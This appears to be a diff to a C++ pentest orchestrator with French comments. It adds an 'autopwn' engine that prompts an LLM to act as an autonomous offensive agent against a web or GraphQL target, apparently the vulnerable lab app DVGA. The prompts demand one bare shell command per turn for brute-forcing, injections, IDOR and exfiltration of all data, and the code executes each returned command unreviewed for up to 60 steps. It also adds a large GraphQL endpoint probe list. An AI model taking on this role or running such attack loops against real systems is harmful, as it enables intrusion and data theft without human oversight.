@@ -365,6 +365,15 @@ static std::string extract_hostname(const std::string &url) {
     return s;
 }
 
+static std::string extract_netloc(const std::string &url) {
+    std::string s = url;
+    size_t p = s.find("://");
+    if (p != std::string::npos) s = s.substr(p + 3);
+    size_t slash = s.find('/');
+    if (slash != std::string::npos) s = s.substr(0, slash);
+    return s; // ex: "dvga:5013"
+}
+
 static std::string current_datetime_string() {
     std::time_t t = std::time(nullptr);
     std::tm tm{};
@@ -422,7 +431,6 @@ static inline const std::string& nuclei_severity_fallback() {
     static const std::string sev = "critical,high,medium,low";
     return sev;
 }
-
 
 // ------------------
 // Simple URL parser helper
@@ -511,6 +519,8 @@ static UrlParts parse_url(const std::string &url_in) {
 
     return p;
 }
+
+
 
 // ========================= IA symbolique - BRUTE LOGIN =========================
 
@@ -4074,6 +4084,541 @@ static bool run_naabu_rescan(const std::string &host,
     return true;
 }
 
+// ============================================================================
+// Helper: extraire la première URL présente dans une commande shell
+// ============================================================================
+static std::string extract_first_url(const std::string &cmd)
+{
+    const char* schemes[] = {"http://", "https://"};
+    size_t best = std::string::npos;
+    const char* chosen = nullptr;
+
+    for (auto s : schemes) {
+        size_t p = cmd.find(s);
+        if (p != std::string::npos && (best == std::string::npos || p < best)) {
+            best = p;
+            chosen = s;
+        }
+    }
+    if (!chosen) return {};
+
+    size_t i = best;
+    while (i < cmd.size()) {
+        char c = cmd[i];
+        if (c == ' ' || c == '"' || c == '\'' || c == '\t' || c == '\n' || c == '\r')
+            break;
+        i++;
+    }
+
+    return cmd.substr(best, i - best);
+}
+
+// ============================================================================
+// Helper: extraire la VRAIE commande shell depuis la sortie du MCP
+// ============================================================================
+static std::string extract_shell_command(const std::string &raw)
+{
+    // 1. Si MCP renvoie un bloc ```…```
+    size_t b = raw.find("```");
+    if (b != std::string::npos) {
+        size_t e = raw.find("```", b + 3);
+        if (e != std::string::npos) {
+            std::string inside = raw.substr(b + 3, e - (b + 3));
+            std::istringstream iss(inside);
+            std::string line;
+            while (std::getline(iss, line)) {
+                // trim
+                while (!line.empty() && (line.back() == ' ' || line.back() == '\t' || line.back() == '\r'))
+                    line.pop_back();
+                size_t i = 0;
+                while (i < line.size() && (line[i] == ' ' || line[i] == '\t'))
+                    i++;
+                if (i < line.size()) return line.substr(i);
+            }
+        }
+    }
+
+    // 2. Sinon, première ligne "non vide"
+    std::istringstream iss(raw);
+    std::string line;
+    while (std::getline(iss, line)) {
+        while (!line.empty() && (line.back() == ' ' || line.back() == '\t' || line.back() == '\r'))
+            line.pop_back();
+        size_t i = 0;
+        while (i < line.size() && (line[i] == ' ' || line[i] == '\t'))
+            i++;
+        if (i < line.size()) return line.substr(i);
+    }
+
+    return {};
+}
+
+// ============================================================================
+// Helper: réécriture AUTOMATIQUE des URL mortes vers la dernière bonne URL
+// ============================================================================
+static std::string rewrite_with_last_good_url(const std::string &cmd,
+                                              const std::string &last_good,
+                                              const std::vector<std::string> &bad)
+{
+    if (last_good.empty()) return cmd;
+
+    std::string url = extract_first_url(cmd);
+    if (url.empty()) return cmd;
+
+    bool dead = false;
+    for (auto &b : bad) {
+        if (b == url) { dead = true; break; }
+    }
+
+    if (!dead) return cmd;
+
+    std::cout << ansi::yellow
+              << "[DVGA] rewrite_with_last_good_url: " << url
+              << " → " << last_good
+              << ansi::reset << std::endl;
+
+    std::string res = cmd;
+    size_t pos = 0;
+    while ((pos = res.find(url, pos)) != std::string::npos) {
+        res.replace(pos, url.size(), last_good);
+        pos += last_good.size();
+    }
+
+    return res;
+}
+/*
+static bool run_graphql_autopwn_mcp(const AgentOptions &opt,
+                                    const fs::path &workdir)
+{
+    if (opt.mcp_path.empty()) {
+        logerr("run_graphql_autopwn_mcp: mcp_path vide");
+        return false;
+    }
+    if (opt.baseurl.empty()) {
+        logerr("run_graphql_autopwn_mcp: baseurl vide");
+        return false;
+    }
+
+    try { fs::create_directories(workdir); }
+    catch (...) {}
+
+    fs::path prompt_file     = workdir / "dvga_prompt.txt";
+    fs::path mcp_raw_log     = workdir / "dvga_mcp_raw.log";
+    fs::path mcp_history_log = workdir / "dvga_mcp_history.txt";
+    fs::path steps_log       = workdir / "dvga_steps.log";
+
+    std::ofstream steps(steps_log);
+    std::ofstream hist(mcp_history_log);
+
+    // --------------------------------------------------------------------
+    // PROMPT BASE
+    // --------------------------------------------------------------------
+    std::string base_prompt =
+        "Tu es un moteur GRAPHQL AUTONOME conçu pour résoudre DVGA 100% automatiquement.\n"
+        "Endpoint GraphQL CIBLE : " + opt.baseurl + "graphql\n"
+        "TU DOIS toujours utiliser cet endpoint EXACT.\n"
+        "Jamais localhost.\n"
+        "Jamais un autre port.\n"
+        "Mode: BLACKBOX COMPLET.\n"
+        "Contraintes:\n"
+        "- Tu ne renvoies STRICTEMENT QU’UNE SEULE commande shell POSIX.\n"
+        "- AUCUN texte. AUCUN markdown. AUCUN commentaire.\n"
+        "- Tu adaptes ta stratégie selon l’historique.\n"
+        "- Tu dois découvrir l’endpoint /graphql, introspecter, brute-forcer, créer un user si nécessaire, exfiltrer toutes les données.\n"
+        "- Ton but final : compromission complète DVGA.\n"
+        "- Quand tu as terminé, renvoie EXACTEMENT : echo \"DVGA_AUTOPWN_DONE\"\n"
+        "\n"
+        "Voici l’historique STRICT, nettoyé, sans bruit :\n"
+        "<full_history>\n";
+
+    auto sanitize = [&](const std::string &raw) {
+        std::string out;
+        for (auto &c : raw) {
+            if (c >= 32 || c == '\n' || c == '\t')
+                out += c;
+        }
+        return out;
+    };
+
+    std::string full_history;
+    std::string last_cmd1, last_cmd2;
+    const int MAX_STEPS = 60;
+
+    for (int step = 0; step < MAX_STEPS; step++)
+    {
+        // ------------------------------------------------------------
+        // Écriture du prompt propre → NO BANNER, NO ASCII, NO ZAP
+        // ------------------------------------------------------------
+        std::ostringstream prompt;
+        prompt << base_prompt
+               << full_history
+               << "\n</full_history>\n"
+               << "Commande suivante :";
+
+        {
+            std::ofstream pf(prompt_file, std::ios::binary);
+            pf << prompt.str();
+        }
+
+        // ------------------------------------------------------------
+        // APPEL MCP (RAW LOG SÉPARÉ)
+        // ------------------------------------------------------------
+        std::ostringstream mcp_cmd;
+        mcp_cmd << quote(opt.mcp_path.string())
+                << " --engine web"
+                << " --chat-file " << quote(prompt_file.string())
+                << " --log "       << quote(mcp_raw_log.string())
+                << " --system "    << quote(base_prompt);
+
+        std::string out_mcp, err_mcp;
+        bool ok = run_command_capture(mcp_cmd.str(), out_mcp, err_mcp, 180000, false);
+        if (!ok) { logerr("MCP ERROR"); return false; }
+
+        std::string raw_response = out_mcp + "\n" + err_mcp;
+
+        // ------------------------------------------------------------
+        // Extraire commande POSIX
+        // ------------------------------------------------------------
+        std::string next_cmd = extract_shell_command(raw_response);
+        next_cmd = sanitize(next_cmd);
+
+        if (next_cmd.empty()) {
+            logerr("MCP n’a rien renvoyé");
+            return false;
+        }
+
+        // STOP
+        if (next_cmd.find("DVGA_AUTOPWN_DONE") != std::string::npos) {
+            std::cout << ansi::green << "[DVGA] --> FIN REELLE" << ansi::reset << std::endl;
+            return true;
+        }
+
+        // ------------------------------------------------------------
+        // Rejet des commandes répétées
+        // ------------------------------------------------------------
+        if (next_cmd == last_cmd1 || next_cmd == last_cmd2) {
+            full_history += "[REJECT: repetition] " + next_cmd + "\n";
+            continue;
+        }
+
+        // ------------------------------------------------------------
+        // Execute commande
+        // ------------------------------------------------------------
+        std::string out, err;
+        run_command_capture(next_cmd, out, err, 120000, false);
+
+        std::string full = sanitize(out + "\n" + err);
+
+        // Steps Log
+        if (steps) {
+            steps << "===== STEP " << step << " =====\n"
+                  << "CMD: " << next_cmd << "\n"
+                  << "OUTPUT:\n" << full << "\n\n";
+        }
+
+        // MCP HISTORY LOG (débridé)
+        if (hist) {
+            hist << "\n[STEP " << step << "]\n"
+                 << "CMD: " << next_cmd << "\n"
+                 << "OUTPUT:\n" << full << "\n";
+        }
+
+        // Historique filtré pour MCP
+        full_history += "CMD=" + next_cmd + "\nOUT=\n" + full + "\n";
+
+        last_cmd2 = last_cmd1;
+        last_cmd1 = next_cmd;
+    }
+
+    logerr("MAX_STEPS atteint sans succès");
+    return false;
+}*/
+
+// =====================================================================
+//  MOTEUR MCP AUTOPWN WEB/API (GraphQL + REST + SQLi + XSS + SSRF, etc.)
+//  -> consomme tous les artefacts du workdir (Katana, FFUF, nuclei, ZAP…)
+// =====================================================================
+static bool run_api_web_autopwn_mcp(const AgentOptions &opt,
+                                    const fs::path &workdir)
+{
+    if (opt.mcp_path.empty()) {
+        logerr("run_api_web_autopwn_mcp: mcp_path vide");
+        return false;
+    }
+    if (opt.baseurl.empty()) {
+        logerr("run_api_web_autopwn_mcp: baseurl vide");
+        return false;
+    }
+
+    try { fs::create_directories(workdir); }
+    catch (...) {}
+
+    // On garde les mêmes noms de fichiers pour ne rien casser
+    fs::path prompt_file     = workdir / "dvga_prompt.txt";
+    fs::path mcp_raw_log     = workdir / "dvga_mcp_raw.log";
+    fs::path mcp_history_log = workdir / "dvga_mcp_history.txt";
+    fs::path steps_log       = workdir / "dvga_steps.log";
+
+    std::ofstream steps(steps_log);
+    std::ofstream hist(mcp_history_log);
+
+    // --------------------------------------------------------------------
+    // 1) Construction d’un CONTEXTE RECON compact à partir des fichiers
+    //    - recon_katana_urls_ok.txt
+    //    - recon_ffuf_*
+    //    - recon_nuclei.txt et tout ce qui contient "nuclei"
+    //    - alerts_filtered.json
+    //    - mcp_urls_*.json
+    //    - target_score.json
+    //    - tout ce qui contient "arjun"
+    // --------------------------------------------------------------------
+    auto safe_read_small = [&](const fs::path &p) -> std::string {
+        std::string raw;
+        try {
+            raw = readFile(p.string());
+        } catch (...) {
+            return std::string("[[ERROR reading file: ") + p.filename().string() + "]]\n";
+        }
+        // On limite la taille pour éviter d’exploser le prompt
+        const size_t MAX_PER_FILE = 16 * 1024; // 16 KB
+        if (raw.size() > MAX_PER_FILE) {
+            raw.resize(MAX_PER_FILE);
+            raw += "\n[[TRONQUE...]]\n";
+        }
+        return raw;
+    };
+
+    auto has_substr = [](const std::string &s, const std::string &needle)->bool {
+        return s.find(needle) != std::string::npos;
+    };
+
+    std::vector<fs::path> recon_files;
+    try {
+        for (const auto &entry : fs::directory_iterator(workdir)) {
+            if (!entry.is_regular_file()) continue;
+            fs::path p = entry.path();
+            std::string name = p.filename().string();
+
+            if (name == "recon_katana_urls_ok.txt" ||
+                name == "recon_nuclei.txt" ||
+                name == "alerts_filtered.json" ||
+                name == "target_score.json" ||
+                (has_substr(name, "recon_ffuf_")) ||
+                (has_substr(name, "nuclei")) ||
+                (has_substr(name, "mcp_urls_") && p.extension() == ".json") ||
+                (has_substr(name, "arjun")))
+            {
+                recon_files.push_back(p);
+            }
+        }
+    } catch (...) {
+        logerr("run_api_web_autopwn_mcp: directory_iterator failed on workdir");
+    }
+
+    std::sort(recon_files.begin(), recon_files.end());
+
+    std::string recon_context;
+    for (const auto &p : recon_files) {
+        recon_context += "===== " + p.filename().string() + " =====\n";
+        recon_context += safe_read_small(p);
+        recon_context += "\n\n";
+    }
+    if (recon_context.empty()) {
+        recon_context = "[[AUCUN FICHIER DE RECON TROUVE DANS LE WORKDIR]]\n";
+    }
+
+    // --------------------------------------------------------------------
+    // 2) PROMPTS MCP
+    // --------------------------------------------------------------------
+    // --------------------------------------------------------------------
+    // 2) PROMPTS MCP
+    // --------------------------------------------------------------------
+
+    // system_prompt = rôle global minimal (obligatoire)
+    std::string system_prompt =
+        "Tu es un moteur d'exploitation WEB/API AUTONOME.\n"
+        "Tu ne renvoies qu'une seule commande shell POSIX par réponse.\n"
+        "Jamais d'explication, jamais de commentaire, jamais de texte superflu.\n"
+        "Tu restes strictement sur le host/port de la cible.\n"
+        "Quand tu as totalement compromis la cible : echo \"DVGA_AUTOPWN_DONE\".\n";
+
+    // base_prompt = contexte complet + recon + historique
+    std::string base_prompt;
+    base_prompt =
+        "CIBLE WEB/API PRINCIPALE : " + opt.baseurl + "\n"
+        "Tu dois rester strictement sur CE host/port. Jamais localhost. Jamais un autre domaine.\n"
+        "\n"
+        "TON RÔLE :\n"
+        "Tu es un agent offensif autonome chargé d’exploiter une application WEB/API.\n"
+        "Tu dois enchaîner les actions offensives en fonction :\n"
+        "- du contexte de reconnaissance fourni (<recon>),\n"
+        "- des résultats ZAP/Nuclei/Katana/FFUF/Arjun/MCP,\n"
+        "- de l’historique exact des commandes.\n"
+        "\n"
+        "SURFACE D’ATTAQUE À COUVRIR (non exhaustif, mais prioritaire) :\n"
+        "1) GRAPHQL\n"
+        "   - Détection d’endpoint : /graphql, /api/graphql, /v1/graphql, etc.\n"
+        "   - Introspection, enumeration, abuse de droits, injections.\n"
+        "   - Lectures d’objets sensibles (users, pastes, audits).\n"
+        "   - Fonctions système (systemDebug, systemHealth, diagnostics).\n"
+        "   - Mutations et modifications de données si présentes.\n"
+        "\n"
+        "2) API REST / JSON\n"
+        "   - Déduction depuis FFUF, Katana, Wayback, Arjun, Nuclei, MCP.\n"
+        "   - Paramètres sensibles, bruteforce de chemins, fuzzing des verbs HTTP.\n"
+        "   - Détection SQLi : classique, boolean-based, time-based.\n"
+        "   - Détection XSS (reflected/stored), injection JSON, erreurs backend.\n"
+        "   - Détection SSRF, LFI, RFI, Path Traversal, uploads dangereux.\n"
+        "\n"
+        "3) AUTHENTICATION / SESSION\n"
+        "   - Bruteforce contrôlé (max 3 tentatives par motif).\n"
+        "   - Test de contournement d’auth, tokens faibles, JWT, cookies.\n"
+        "   - Test des endpoints admin/api/v1/admin/v1/users/…\n"
+        "\n"
+        "4) ABUS DE LOGIQUE\n"
+        "   - IDOR (modification d’ID numériques).\n"
+        "   - Mass assignment, bypass de permissions.\n"
+        "   - Endpoints “debug”, “health”, “diagnostics”, “status”.\n"
+        "\n"
+        "RÈGLES CRITIQUES :\n"
+        "- Toujours une seule commande POSIX par réponse.\n"
+        "- Jamais un mot, jamais une explication, jamais un commentaire.\n"
+        "- Ne jamais réessayer une stratégie qui a déjà échoué 3 fois dans l’historique.\n"
+        "- Reconnaître automatiquement un succès :\n"
+        "    * Exfiltration de données sensibles (users, tokens, secrets…)\n"
+        "    * Fonctions système accessibles (debug/health/update/diagnostics)\n"
+        "    * Dump d’objets internes\n"
+        "    * Flag, secret, mot de passe admin trouvé\n"
+        "    * RCE, lecture de /proc, ps, env, ou sortie système\n"
+        "- Dès qu’un succès notable apparaît → renvoyer :\n"
+        "    echo \"DVGA_AUTOPWN_DONE\"\n"
+        "\n"
+        "RECON CENTRALISÉ (fourni par l’orchestrateur) :\n"
+        "<recon>\n" + recon_context + "\n</recon>\n"
+        "\n"
+        "HISTORIQUE STRICT DES COMMANDES ET RÉSULTATS :\n"
+        "Tu dois t’en servir pour changer de stratégie immédiatement si :\n"
+        "- un endpoint échoue plusieurs fois,\n"
+        "- un pattern de brute-force est détecté,\n"
+        "- une donnée interne ou un flag apparaît.\n"
+        "\n"
+        "<full_history>\n";
+
+    auto sanitize = [&](const std::string &raw) {
+        std::string out;
+        out.reserve(raw.size());
+        for (unsigned char c : raw) {
+            if (c >= 32 || c == '\n' || c == '\t')
+                out.push_back((char)c);
+        }
+        return out;
+    };
+
+    std::string full_history;
+    std::string last_cmd1, last_cmd2;
+    const int MAX_STEPS = 60;
+
+    for (int step = 0; step < MAX_STEPS; step++)
+    {
+        // ------------------------------------------------------------
+        // 2.a) Écriture du prompt de chat (avec historique)
+        // ------------------------------------------------------------
+        std::ostringstream prompt;
+        prompt << base_prompt
+               << full_history
+               << "\n</full_history>\n"
+               << "Commande suivante (UNE SEULE, shell POSIX, sans commentaire) :";
+
+        {
+            std::ofstream pf(prompt_file, std::ios::binary);
+            pf << prompt.str();
+        }
+
+        // ------------------------------------------------------------
+        // 2.b) APPEL MCP (RAW LOG SÉPARÉ)
+        // ------------------------------------------------------------
+        std::ostringstream mcp_cmd;
+        mcp_cmd << quote(opt.mcp_path.string())
+                << " --engine web"
+                << " --chat-file " << quote(prompt_file.string())
+                << " --log "       << quote(mcp_raw_log.string())
+                << " --system "    << quote(system_prompt);
+
+        std::string out_mcp, err_mcp;
+        bool ok = run_command_capture(mcp_cmd.str(), out_mcp, err_mcp, 180000, false);
+        if (!ok) {
+            logerr("run_api_web_autopwn_mcp: MCP ERROR");
+            return false;
+        }
+
+        std::string raw_response = out_mcp + "\n" + err_mcp;
+
+        // ------------------------------------------------------------
+        // 2.c) Extraire commande POSIX
+        // ------------------------------------------------------------
+        std::string next_cmd = extract_shell_command(raw_response);
+        next_cmd = sanitize(next_cmd);
+
+        if (next_cmd.empty()) {
+            logerr("run_api_web_autopwn_mcp: MCP n’a rien renvoyé");
+            return false;
+        }
+
+        // STOP
+        if (next_cmd.find("DVGA_AUTOPWN_DONE") != std::string::npos) {
+            std::cout << ansi::green
+                      << "[API/AUTOPWN] --> FIN REELLE (DVGA_AUTOPWN_DONE)"
+                      << ansi::reset << std::endl;
+            return true;
+        }
+
+        // ------------------------------------------------------------
+        // 2.d) Rejet des commandes répétées (boucles infinies)
+        // ------------------------------------------------------------
+        if (next_cmd == last_cmd1 || next_cmd == last_cmd2) {
+            full_history += "[REJECT: repetition] " + next_cmd + "\n";
+            continue;
+        }
+
+        // ------------------------------------------------------------
+        // 2.e) Exécution de la commande shell
+        // ------------------------------------------------------------
+        std::string out, err;
+        run_command_capture(next_cmd, out, err, 120000, false);
+
+        std::string full = sanitize(out + "\n" + err);
+
+        // Steps Log (lisible par un humain)
+        if (steps) {
+            steps << "===== STEP " << step << " =====\n"
+                  << "CMD: " << next_cmd << "\n"
+                  << "OUTPUT:\n" << full << "\n\n";
+        }
+
+        // MCP HISTORY LOG (débridé)
+        if (hist) {
+            hist << "\n[STEP " << step << "]\n"
+                 << "CMD: " << next_cmd << "\n"
+                 << "OUTPUT:\n" << full << "\n";
+        }
+
+        // Historique compact renvoyé au LLM
+        full_history += "CMD=" + next_cmd + "\nOUT=\n" + full + "\n";
+
+        last_cmd2 = last_cmd1;
+        last_cmd1 = next_cmd;
+    }
+
+    logerr("run_api_web_autopwn_mcp: MAX_STEPS atteint sans succès");
+    return false;
+}
+
+// Wrapper de compatibilité si d'autres parties du code appellent encore l’ancien nom
+static bool run_graphql_autopwn_mcp(const AgentOptions &opt,
+                                    const fs::path &workdir)
+{
+    return run_api_web_autopwn_mcp(opt, workdir);
+}
 
 // -----------------------------------------------------------------------------
 // Phase 3 : Orchestrateur post-exploit Web / HTTP (IA symbolique)
@@ -5090,54 +5635,65 @@ static std::string slurp_if_exists(const fs::path& p) {
     }
 }
 
-// Parse des URLs candidates d’API depuis katana/wayback/dirb
-static void harvest_api_from_urls_file(const fs::path& f,
-                                       std::vector<std::string>& rest_full,
-                                       std::set<std::string>& rest_bases,
-                                       std::set<std::string>& openapi_paths,
-                                       std::set<std::string>& graphql_eps)
+static void harvest_api_from_urls_file(
+    const std::filesystem::path& f,
+    std::vector<std::string>& rest_full,
+    std::set<std::string>&      rest_bases,
+    std::set<std::string>&      openapi_paths,
+    std::set<std::string>&      graphql_eps)
 {
+    namespace fs = std::filesystem;
     if (!fs::exists(f)) return;
 
     std::ifstream in(f);
     std::string line;
+
+    static const char* KEYS[] = {
+        "login","signin","sign-in","logon","authenticate","auth",
+        "register","signup","sign-up","forgot","reset","password",
+        "logout","twofactor","mfa","callback","redirect","session","token",
+        "admin","administrator","backoffice","dashboard","account","profile","settings","config","debug",
+        "upload","import","file","backup","restore","export","download","attachment",
+        "search","query","filter","report","analytics",
+        "swagger","openapi","api-docs","v3/api-docs","swagger-ui","swagger.json",
+        "graphql","graphiql","playground","gql",
+        ".php",".asp",".aspx",".jsp",".do"
+    };
+
+    auto to_lower = [](std::string s){ std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c){return std::tolower(c);}); return s; };
+
     while (std::getline(in, line)) {
-        std::string raw = extract_url_from_line(line);
-        auto u = trim_copy(raw.empty() ? trim_copy(line) : raw);
-        if (u.empty() || u.find("http") != 0) continue;
+        std::string u = trim_copy(extract_url_from_line(line).empty() ? line : extract_url_from_line(line));
+        if (u.empty() || u.rfind("http", 0) != 0) continue;
 
-        std::string low = to_lower_copy(u);
+        std::string low = to_lower(u);
 
-        if (low.find("/graphql") != std::string::npos) {
+        // collect GraphQL/OpenAPI
+        if (low.find("/graphql")!=std::string::npos || low.find("/gql")!=std::string::npos ||
+            low.find("/graphiql")!=std::string::npos || low.find("/playground")!=std::string::npos) {
             graphql_eps.insert(u);
         }
-        if (low.find("/swagger")  != std::string::npos ||
-            low.find("/openapi")  != std::string::npos ||
-            low.find("/v3/api-docs") != std::string::npos ||
-            low.find("/api-docs") != std::string::npos) {
+        if (low.find("/swagger")!=std::string::npos || low.find("/openapi")!=std::string::npos ||
+            low.find("/v3/api-docs")!=std::string::npos || low.find("/api-docs")!=std::string::npos ||
+            low.find("/swagger-ui")!=std::string::npos || low.find("/swagger.json")!=std::string::npos) {
             openapi_paths.insert(u);
         }
 
-        // REST bases heuristiques
-        auto pos_api = low.find("/api");
-        auto pos_v   = low.find("/v1/");
-        bool is_rest = (pos_api != std::string::npos) ||
-                       (pos_v   != std::string::npos);
+        bool looks_rest = (low.find("/api")!=std::string::npos) || (low.find("/v1/")!=std::string::npos);
+        bool interesting=false; for (auto*k:KEYS) { if (low.find(k)!=std::string::npos){ interesting=true; break; } }
 
-        if (is_rest) {
+        if (looks_rest || interesting) {
             rest_full.push_back(u);
 
-            // base = scheme://host[/api] ou [/v1]
-            auto r = url_root(u);
-            std::string base = r;
-            if (pos_api != std::string::npos)
-                base = join_url(r, "/api");
-            if (pos_v != std::string::npos)
-                base = join_url(r, "/v1");
+            auto root = url_root(u);
+            std::string base = root;
+            if (low.find("/api")!=std::string::npos) base = join_url(root, "/api");
+            else if (low.find("/v1/")!=std::string::npos) base = join_url(root, "/v1");
             rest_bases.insert(base);
         }
     }
 }
+
 
 // Détection Gateways et HTTP/2/gRPC : httpx + whatweb
 static void detect_gateways_and_h2(const fs::path& workdir,
@@ -5185,6 +5741,7 @@ static nlohmann::json harvest_api_triggers(const std::string& baseurl,
     std::set<std::string>    gateways;
     std::vector<std::string> webrtc_signaling;
 
+    // Récolte depuis Katana/Wayback/Dirb (filtrage élargi via la fonction ci-dessus)
     harvest_api_from_urls_file(workdir / "recon_katana_urls_ok.txt",
                                rest_full, rest_bases, openapi_paths, graphql_eps);
     harvest_api_from_urls_file(workdir / "recon_waybackurls.txt",
@@ -5192,26 +5749,133 @@ static nlohmann::json harvest_api_triggers(const std::string& baseurl,
     harvest_api_from_urls_file(workdir / "recon_dirb_common.txt",
                                rest_full, rest_bases, openapi_paths, graphql_eps);
 
+    // Détection gateways & HTTP/2 (existant)
     detect_gateways_and_h2(workdir, baseurl, gateways, has_h2, webrtc_signaling);
 
-    // Ports gRPC classiques si Naabu a tourné (best-effort)
+    // === PROBE GraphQL actifs sur suffixes standards ===
+    // === PROBE GraphQL actifs sur suffixes standards (liste élargie) ===
+    {
+        std::string root = url_root(baseurl);
+
+        static const char* GQL_SUFFIXES[] = {
+            "/graphql",
+            "/api/graphql",
+            "/v1/graphql",
+            "/v2/graphql",
+            "/v3/graphql",
+            "/graphql/v1",
+            "/graphql/v2",
+            "/graphql/v3",
+            "/gql",
+            "/api/gql",
+            "/v1/gql",
+            "/v2/gql",
+            "/graphiql",
+            "/playground",
+            "/graphql/playground",
+            "/altair",
+            "/graphql/altair",
+            "/voyager",
+            "/graphql/voyager",
+            "/graph",
+            "/api/graph",
+            "/query",
+            "/graphql/query",
+            "/api/graphql/query",
+            "/graphql/console",
+            "/graphql/api",
+            "/api/v1/graphql",
+            "/api/v2/graphql",
+            "/api/v3/graphql",
+            "/api/graphql/v1",
+            "/api/graphql/v2",
+            "/api/graphql/v3",
+            "/_graphql",
+            "/graphql/",
+            "/api/graphql/",
+            "/v1/graphql/",
+            "/v2/graphql/",
+            "/v3/graphql/",
+            "/graphql/v1/",
+            "/graphql/v2/",
+            "/graphql/v3/",
+            "/gql/",
+            "/api/gql/",
+            "/graphiql/",
+            "/playground/",
+            "/graphql/playground/",
+            "/altair/",
+            "/graphql/altair/",
+            "/voyager/",
+            "/graphql/voyager/",
+            "/graph/",
+            "/api/graph/",
+            "/query/",
+            "/graphql/query/",
+            "/graphql/schema",
+            "/graphql/introspect",
+            "/graphql/introspection",
+            "/graphql-explorer",
+            "/explore/graphql",
+            "/explorer/graphql"
+        };
+
+        for (auto* suf : GQL_SUFFIXES) {
+            std::string u = join_url(root, suf);
+
+            nlohmann::json probe = {
+                {"query", "{ __typename }"}
+            };
+
+            std::string data = probe.dump();
+
+            std::ostringstream cmd;
+            cmd << "curl -sk -X POST "
+                << "-H 'Content-Type: application/json' "
+                << "-d " << shell_escape_double_quotes(data) << " "
+                << shell_escape_double_quotes(u);
+
+            std::string out, err;
+            bool ok = run_command_capture(cmd.str(), out, err, 5000, false);
+
+            if (!ok || out.empty()) continue;
+
+            if (out.find("\"data\"") != std::string::npos ||
+                out.find("\"errors\"") != std::string::npos)
+            {
+                graphql_eps.insert(u);
+            }
+        }
+    }
+
+
+    // Ports gRPC classiques si Naabu a tourné (best-effort) — code existant conservé
     std::vector<uint16_t> grpc_ports;
     {
-        fs::path naabu_all = find_newest_file_containing(workdir, "naabu");
-        std::set<int> ports =
-            parse_naabu_ports(naabu_all.empty()
-                              ? workdir / "recon_naabu_all.txt"
-                              : naabu_all);
-        for (int p : ports) {
-            if (p == 50051 || p == 50052 || p == 8443)
-                grpc_ports.push_back(static_cast<uint16_t>(p));
+        fs::path naabu_all = workdir / "recon_naabu_all.txt";
+        if (fs::exists(naabu_all)) {
+            std::ifstream in(naabu_all);
+            std::string line;
+            while (std::getline(in, line)) {
+                auto t = trim_copy(line);
+                if (t == "80"  || t == "81"  || t == "88" ||
+                    t == "443" || t == "8443" || t == "50051" ||
+                    t == "50052" || t == "8080" || t == "18080") {
+                    try {
+                        uint16_t p = (uint16_t)std::stoul(t);
+                        if (std::find(grpc_ports.begin(), grpc_ports.end(), p) == grpc_ports.end())
+                            grpc_ports.push_back(p);
+                    } catch(...) {}
+                }
+            }
         }
         if (grpc_ports.empty() && has_h2) {
-            // HTTP/2 only : on tente 443 en gRPC plaintext pour reflection best-effort
+            // HTTP/2 only : tenter 443 en gRPC plaintext pour reflection (best-effort)
             grpc_ports.push_back(443);
         }
     }
 
+    // Serialization du "trig" (consommé partout ensuite, y compris append_api_enum_cmds)
     json j;
     j["rest_bases"]         = json::array();
     for (auto& b : rest_bases) j["rest_bases"].push_back(b);
@@ -5265,112 +5929,6 @@ static void add_api_flow(std::vector<ConfirmationCommand>& plan,
         {"outfile",     outfile.string()},
         {"meta",        meta}
     });
-}
-
-// Construire les commandes d’ENUM OpenAPI/GraphQL/gRPC
-static void append_api_enum_cmds(const std::string& baseurl,
-                                 const fs::path& workdir,
-                                 const nlohmann::json& trig,
-                                 std::vector<ConfirmationCommand>& plan,
-                                 nlohmann::json& plan_json)
-{
-    using nlohmann::json;
-    int idx = 0;
-
-    // REST OpenAPI depuis bases
-    static const char* SPEC_CAND[] = {
-        "/openapi.json",
-        "/swagger.json",
-        "/swagger/v1/swagger.json",
-        "/v1/swagger.json",
-        "/swagger-ui.html",
-        "/api-docs",
-        "/v3/api-docs",
-        "/swagger/docs/v1",
-        "/swagger/v2/swagger.json"
-    };
-
-    for (auto& b : trig.value("rest_bases", json::array())) {
-        std::string base = b.get<std::string>();
-        std::string root = url_root(base);
-        for (auto* sp : SPEC_CAND) {
-            std::string u    = join_url(root, sp);
-            std::string safe = shell_escape_double_quotes(u);
-            fs::path out     = workdir / ("FLOW_API_ENUM_openapi_" +
-                                          std::to_string(idx++) + ".txt");
-            std::string cmd  =
-                "curl -skL -H \"Accept: application/json, */*\" \"" +
-                safe + "\" -D -";
-            add_api_flow(plan, plan_json,
-                         "FLOW_API_ENUM_" + std::to_string(idx),
-                         "API_ENUM", u,
-                         "API ENUM: tentative d’extraction OpenAPI/Swagger " + u,
-                         cmd, out, {{"base", b}});
-        }
-    }
-
-    // OpenAPI explicit (candidats découverts)
-    for (auto& c : trig.value("openapi_candidates", json::array())) {
-        std::string u    = c.get<std::string>();
-        std::string safe = shell_escape_double_quotes(u);
-        fs::path out     = workdir / ("FLOW_API_ENUM_openapi_" +
-                                      std::to_string(idx++) + ".txt");
-        std::string cmd  =
-            "curl -skL -H \"Accept: application/json, */*\" \"" +
-            safe + "\" -D -";
-        add_api_flow(plan, plan_json,
-                     "FLOW_API_ENUM_" + std::to_string(idx),
-                     "API_ENUM", u,
-                     "API ENUM: OpenAPI/Swagger candidat " + u,
-                     cmd, out);
-    }
-
-    // GraphQL introspection (minimale)
-    {
-        int g = 0;
-        for (auto& ep : trig.value("graphql_endpoints", json::array())) {
-            std::string url  = ep.get<std::string>();
-            std::string safe = shell_escape_double_quotes(url);
-            std::string body = R"({"query":"{__schema{types{name}}}"})";
-            fs::path out     = workdir / ("FLOW_API_ENUM_graphql_" +
-                                          std::to_string(g) + ".json");
-            std::string cmd  =
-                "curl -sk -H \"Content-Type: application/json\" -D - \"" +
-                safe + "\" --data-binary '" + body + "'";
-            add_api_flow(plan, plan_json,
-                         "FLOW_API_ENUM_GRAPHQL_" + std::to_string(g),
-                         "API_ENUM", url,
-                         "API ENUM: introspection GraphQL " + url,
-                         cmd, out, {{"endpoint", "graphql"}});
-            ++g;
-        }
-    }
-
-    // gRPC via grpcurl si réflexion (best-effort)
-    {
-        std::string host = extract_hostname(baseurl);
-        int g = 0;
-        for (auto& p : trig.value("grpc_ports", json::array())) {
-            uint16_t port = static_cast<uint16_t>(p.get<int>());
-            std::ostringstream cmd;
-#  ifdef _WIN32
-            cmd << "grpcurl -max-time 5 -plaintext "
-                << host << ":" << port << " list";
-#  else
